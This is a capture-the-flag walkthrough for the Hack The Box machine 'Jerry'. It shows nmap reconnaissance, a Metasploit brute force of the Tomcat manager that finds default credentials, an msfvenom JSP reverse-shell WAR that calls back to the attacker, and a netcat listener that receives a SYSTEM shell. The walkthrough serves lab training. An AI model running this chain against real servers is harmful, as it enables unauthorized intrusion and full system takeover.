# Jerry

Machine Level: Easy <br />
OS: Windows

## Scanning 
I ran an aggressive nmap scan using the ```-A``` flag as well as the no ping probe. 
```
ajread@aj-ubuntu:~/hackthebox$ nmap -A [REMOTE IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-06 19:32 EST
Nmap scan report for [REMOTE IP]
Host is up (0.019s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
```
## Initial Access
It looked like I need to go after Apache Tomcat. I found a metasploit module (```auxiliary(scanner/http/tomcat_mgr_login)```that could scan the tomcat manager on port 8080. With the scanner, it guessed various common usernames and passwords. It found one! 
```
[+] [REMOTE IP]:8080 - Login Successful: tomcat:s3cret
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
I was able to log in to the Apache Tomcat instance. Based on the server, it looked like I could upload a WAR file "to deploy." I created a shell using msfvenom and pointed back to my IP. 
```
ajread@aj-ubuntu:~/hackthebox$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL IP]LPORT=9999 -f war > shell.war
```
It looked like uploading a file would place it as an application on the server. I started a netcat listener on my local machine and clicked on the application within the Apache Tomcat server. 
```
ajread@aj-ubuntu:~$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [REMOTE IP] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
The WAR reverse shell dropped me into a privileged shell! I was able to find both the root and user flags. 
```
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,418,806,784 bytes free
```